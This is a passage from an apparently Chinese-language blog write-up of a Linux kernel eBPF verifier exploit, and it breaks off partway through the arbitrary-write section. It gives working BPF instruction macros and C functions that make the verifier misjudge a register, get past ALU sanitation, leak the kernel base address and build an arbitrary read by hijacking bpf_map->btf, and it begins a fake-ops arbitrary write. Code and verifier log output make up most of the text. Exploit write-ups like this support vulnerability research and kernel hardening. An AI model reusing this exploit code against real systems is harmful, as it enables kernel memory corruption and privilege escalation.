<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VULN_REG    BPF_REG_6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_READ_ARRAY_MAP_IDX(__idx, __map_fd, __dst_reg)                   \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* get a pointer to bpf_array */</span>                \</span></span><br><span class="line"><span class="meta">        BPF_LD_MAP_FD(BPF_REG_9, __map_fd),             \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),            \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),           \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),          \</span></span><br><span class="line"><span class="meta">        BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, __idx),        \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* if success, r0 will be ptr to value, 0 for failed */</span>              \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),          \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* mov the result back and clear R0 */</span>          \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(__dst_reg, BPF_REG_0),            \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRIGGER_VULN(__map_fd)                          \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* load value into r2, make it part-unknown */</span>  \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8), \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, VULN_REG, BPF_REG_8, 0),    \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_4, 0xffffffff),           \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, 32),          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_4),    \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),          \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* r3 = 0x100000002 */</span>                          \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_3, 0x1),                  \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_3, 32),          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, 0x2),         \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* triger the vulnerability */</span>                  \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_3)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>因为 R1~R5 有的时候要用来作为函数参数，所以这里在 R6 上构造</li>
<li>此时 R6 32 位边界值为 <code>[1, 0]</code> ，32位运行时值为 <code>0</code></li>
</ul>
<p>构造运行时为 “1” 但 verifier 确信为 “0” 的寄存器：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAKE_VULN_REG(__map_fd)                         \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* load value into r3, make it [0, 1] under 32 bit */</span>                \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8), \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),   \</span></span><br><span class="line"><span class="meta">        BPF_JMP32_IMM(BPF_JLE, BPF_REG_7, 1, 2),        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                    \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_ADD, VULN_REG, BPF_REG_7),    \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_AND, VULN_REG, 0x1),          \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>构造出另一个 32 位边界值为 <code>[0, 1]</code> ，32位运行时值为 <code>0</code> 寄存器 R7</li>
<li>把寄存器 R6 和 R7 相加，得到新的 R6，边界值为 <code>[1, 1]</code> ，32位运行时值为 <code>0</code>，于是便获得了一个运行时为 “0” 但 verifier 认为是 “1” 的寄存器 </li>
<li>如果我们再给 R6 加上 <code>1</code> ，从而使得边界值为 <code>[2, 2]</code> ，但实际上的 32 位值为 <code>1</code></li>
<li>再将 R6 与 <code>1</code> 做 <code>&amp;</code> 运算，从而使得边界值为 <code>[0, 0]</code> ，但实际上的 32 位值为 <code>1</code></li>
<li>最终 verifier 便会认为该寄存器的值变为 “0”，但其实际上的运行时值为 “1”</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">36</span>: (<span class="number">07</span>) r6 += <span class="number">1</span></span><br><span class="line"><span class="number">37</span>: R0_w=invP0 R6_w=invP(id=<span class="number">0</span>,smin_value=<span class="number">-9223372036854775806</span>,smax_value=<span class="number">9223372</span></span><br><span class="line"><span class="number">032559808514</span>,umin_value=<span class="number">2</span>,umax_value=<span class="number">18446744069414584322</span>,var_off=(<span class="number">0x2</span>; <span class="number">0xffffff</span></span><br><span class="line">ff00000000),s32_min_value=<span class="number">2</span>,s32_max_value=<span class="number">2</span>,u32_max_value=<span class="number">2</span>) R7_w=invP(id=<span class="number">0</span>,smax</span><br><span class="line">_value=<span class="number">9223372032559808513</span>,umax_value=<span class="number">18446744069414584321</span>,var_off=(<span class="number">0x0</span>; <span class="number">0xfffff</span></span><br><span class="line">fff00000001),s32_min_value=<span class="number">0</span>,s32_max_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>) R8_w=map_value(id=</span><br><span class="line"><span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R9=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp</span><br><span class="line"><span class="number">-8</span>=mmmmmmmm</span><br><span class="line">    <span class="comment">/* r6=&#123;s32_min_value=2,s32_max_value=2&#125;,var_off=(0x2; 0xffffffff00000000) */</span></span><br><span class="line"><span class="number">37</span>: (<span class="number">57</span>) r6 &amp;= <span class="number">1</span></span><br><span class="line"><span class="number">38</span>: R0_w=invP0 R6_w=invP0 R7_w=invP(id=<span class="number">0</span>,smax_value=<span class="number">9223372032559808513</span>,umax_val</span><br><span class="line">ue=<span class="number">18446744069414584321</span>,var_off=(<span class="number">0x0</span>; <span class="number">0xffffffff00000001</span>),s32_min_value=<span class="number">0</span>,s32_ma</span><br><span class="line">x_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>) R8_w=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R9=map_</span><br><span class="line">ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>=mmmmmmmm</span><br><span class="line">    <span class="comment">/* r6=0,var_off=(0x0; 0xffffffff00000000) */</span></span><br></pre></td></tr></table></figure>
<p>泄露内核基地址：</p>
<p>对于 <code>BPF_MAP_TYPE_ARRAY</code> 类型 的 map 而言，其 wrapper 为 <code>bpf_array</code> 类型（即 <code>bpf_map</code> 内嵌于该结构体中），数据则直接存放在其内部的 <code>value</code> 数组成员当中，因此在查找元素时我们获得的其实是一个指向 <code>bpf_array</code> 内部的指针 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_array</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> <span class="title">map</span>;</span></span><br><span class="line">	u32 elem_size;</span><br><span class="line">	u32 index_mask;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_array_aux</span> *<span class="title">aux</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="keyword">char</span> value[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line">		<span class="keyword">void</span> *ptrs[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line">		<span class="keyword">void</span> __percpu *pptrs[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>因此我们只需要前向读取便能读取到 <code>bpf_map</code>，之后可以通过 <code>bpf_map</code> 的函数表泄露内核地址 </li>
</ul>
<p>理论上我们可以构造寄存器，使 verifier 将负数识别为 “0”，但实际上我们还要突破 ALU Sanitation 的检查：</p>
<ul>
<li>ALU Sanitation 是一个用于运行时动态检测的功能，通过对程序正在处理的实际值进行运行时检查以弥补 verifier 静态分析的不足 </li>
<li>核心原理就是在 eBPF 程序中的每一条指令前面都添加上额外的辅助指令</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">*patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux-&gt;alu_limit - <span class="number">1</span>);</span><br><span class="line">*patch++ = BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, off_reg);</span><br><span class="line">*patch++ = BPF_ALU64_REG(BPF_OR, BPF_REG_AX, off_reg);</span><br><span class="line">*patch++ = BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, <span class="number">0</span>);</span><br><span class="line">*patch++ = BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, <span class="number">63</span>);</span><br><span class="line"><span class="keyword">if</span> (issrc) &#123;</span><br><span class="line">    *patch++ = BPF_ALU64_REG(BPF_AND, BPF_REG_AX, off_reg);</span><br><span class="line">    insn-&gt;src_reg = BPF_REG_AX;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    *patch++ = BPF_ALU64_REG(BPF_AND, off_reg, BPF_REG_AX);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>其中 <code>aux-&gt;alu_limit</code> 为当前指针运算范围，初始时为 “0”，与指针所做的常量运算同步</li>
<li>对于减法而言可读范围为 <code>(ptr - alu_limit, ptr]</code>（这里保证了指针的偏移不会为负）</li>
</ul>
<p>由于我们有运行时为 “1”，但 verifier 认为是 “0” 的寄存器，我们可以这样调整范围：</p>
<ul>
<li>构造另外一个同样是运行时值为 “1”，但 verifier 认为是 “0” 的寄存器 R8（可以选择直接将 R6 拷贝给 R8）</li>
<li>令 R7 指向 map 第一个元素的第一个字节 <code>value[0]</code> </li>
<li>将 R7 加上 <code>0x1000</code>（<code>R7 = value[0x1000]</code>，<code>alu_limit = 0x1000</code>）</li>
<li>将 R8 乘上 <code>0x1000</code>（<code>R8 = 0x1000</code>）</li>
<li>执行 <code>R7 -= R8</code>，由于 verifier 认为 R8 为 “0”，因此 <code>alu_limit</code> 保持不变，但 R7 实际上已经指回了 <code>value[0]</code></li>
<li>执行 <code>R7 -= 0x110</code>（<code>R7 = value[-0x110]</code>，<code>alu_limit = 0x1000</code>）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEAK_MAP_OPS(__map_fd)                             \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* extend the alu-&gt;limit and do the oob read */</span>    \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7),    \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),         \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),         \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),      \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x110),           \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),       \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),      \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_7),    \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0)</span></span><br></pre></td></tr></table></figure>
<p>构造任意读 RAA：</p>
<p>现在我们能够读写 <code>bpf_map</code> 中的数据，我们需要注意其中的 <code>btf</code> 指针：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> &#123;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> *<span class="title">ops</span> ____<span class="title">cacheline_aligned</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">inner_map_meta</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span> *security;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">bpf_map_type</span> <span class="title">map_type</span>;</span></span><br><span class="line">	u32 key_size;</span><br><span class="line">	u32 value_size;</span><br><span class="line">	u32 max_entries;</span><br><span class="line">	u32 map_flags;</span><br><span class="line">	<span class="keyword">int</span> spin_lock_off; <span class="comment">/* &gt;=0 valid offset, &lt;0 error */</span></span><br><span class="line">	u32 id;</span><br><span class="line">	<span class="keyword">int</span> numa_node;</span><br><span class="line">	u32 btf_key_type_id;</span><br><span class="line">	u32 btf_value_type_id;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">btf</span> *<span class="title">btf</span>;</span></span><br><span class="line">    ......</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>但函数 <code>bpf_map_get_info_by_fd</code> 被调用时，程序会把 <code>bpf_map-&gt;btf.id</code> 拷贝给用户空间</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_map_get_info_by_fd</span><span class="params">(struct file *file,</span></span></span><br><span class="line"><span class="params"><span class="function">				  struct bpf_map *<span class="built_in">map</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">				  <span class="keyword">const</span> <span class="keyword">union</span> bpf_attr *attr,</span></span></span><br><span class="line"><span class="params"><span class="function">				  <span class="keyword">union</span> bpf_attr __user *uattr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info</span> __<span class="title">user</span> *<span class="title">uinfo</span> =</span> u64_to_user_ptr(attr-&gt;info.info);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info</span> <span class="title">info</span>;</span></span><br><span class="line">	u32 info_len = attr-&gt;info.info_len;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">map</span>-&gt;btf) &#123;</span><br><span class="line">		info.btf_id = btf_obj_id(<span class="built_in">map</span>-&gt;btf);</span><br><span class="line">		info.btf_key_type_id = <span class="built_in">map</span>-&gt;btf_key_type_id;</span><br><span class="line">		info.btf_value_type_id = <span class="built_in">map</span>-&gt;btf_value_type_id;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (copy_to_user(uinfo, &amp;info, info_len) ||</span><br><span class="line">	    put_user(info_len, &amp;uattr-&gt;info.info_len))</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>劫持 <code>bpf_map-&gt;btf</code> 即可完成 RAA：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> READ_ARBITRARY_ADDR(__map_fd, __idx)            \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* extend the alu-&gt;limit and do the oob read */</span>     \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7),     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),                 \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),       \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xd0),             \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* write the value into bpf_map-&gt;btf */</span>             \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),        \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(__idx, __map_fd, BPF_REG_8), \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_8, 0),       \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, 0x58),            \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_1, 0)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>前半部分使用相同的方法来绕过 <code>alu_limit</code>，后半部分尝试覆盖 <code>bpf_map-&gt;btf</code>（这里的 0x58 是 <code>btf.id</code> 的偏移）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">size_t</span> <span class="title">read_arbitrary_addr_4_bytes</span><span class="params">(<span class="keyword">int</span> map_fd, <span class="keyword">int</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> data;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">prog</span>[] =</span> &#123;</span><br><span class="line">        TRIGGER_VULN(map_fd),</span><br><span class="line">        MAKE_VULN_REG(map_fd),</span><br><span class="line">        READ_ARBITRARY_ADDR(map_fd, idx),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    ret = run_bpf_prog(prog, <span class="keyword">sizeof</span>(prog) / <span class="keyword">sizeof</span>(prog[<span class="number">0</span>]), <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info</span> <span class="title">info</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .info.bpf_fd = map_fd,</span><br><span class="line">        .info.info_len = <span class="keyword">sizeof</span>(info),</span><br><span class="line">        .info.info = (<span class="keyword">uint64_t</span>)&amp;info,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;info, <span class="number">0</span>, <span class="keyword">sizeof</span>(info));</span><br><span class="line">    ret = bpf(BPF_OBJ_GET_INFO_BY_FD, &amp;attr);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    data = info.btf_id;</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">read_arbitrary_addr</span><span class="params">(<span class="keyword">int</span> map_fd, <span class="keyword">size_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> data;</span><br><span class="line">    <span class="keyword">int</span> key;</span><br><span class="line">    <span class="keyword">size_t</span> value[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">    key = <span class="number">1</span>;</span><br><span class="line">    value[<span class="number">0</span>] = addr;</span><br><span class="line">    <span class="keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="number">0</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to load value into map!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    key = <span class="number">2</span>;</span><br><span class="line">    value[<span class="number">0</span>] = addr + <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="number">0</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to load value into map!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    data = read_arbitrary_addr_4_bytes(map_fd, <span class="number">2</span>);</span><br><span class="line">    data &lt;&lt;= <span class="number">32</span>;</span><br><span class="line">    data += read_arbitrary_addr_4_bytes(map_fd, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>构造任意写 WAA：</p>
<p>核心思想就是覆盖 <code>bpf_map-&gt;ops</code> 为 <code>bpf_array.value</code>（可控地址），并在 <code>bpf_array.value</code> 上伪造一个 fake ops 将 <code>ops-&gt;map_push_elem</code> 替换为 <code>array_map_get_next_key</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">array_map_get_next_key</span><span class="params">(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key, <span class="keyword">void</span> *next_key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_array</span> *<span class="title">array</span> =</span> container_of(<span class="built_in">map</span>, struct bpf_array, <span class="built_in">map</span>);</span><br><span class="line">	u32 index = key ? *(u32 *)key : U32_MAX;</span><br><span class="line">	u32 *next = (u32 *)next_key;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (index &gt;= <span class="built_in">array</span>-&gt;<span class="built_in">map</span>.max_entries) &#123;</span><br><span class="line">		*next = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (index == <span class="built_in">array</span>-&gt;<span class="built_in">map</span>.max_entries - <span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> -ENOENT;</span><br><span class="line"></span><br><span class="line">	*next = index + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>当 <code>key</code> 小于 <code>map.max_entries</code> 时，<code>key</code> 会被写入到 <code>next_key</code> 当中 </li>
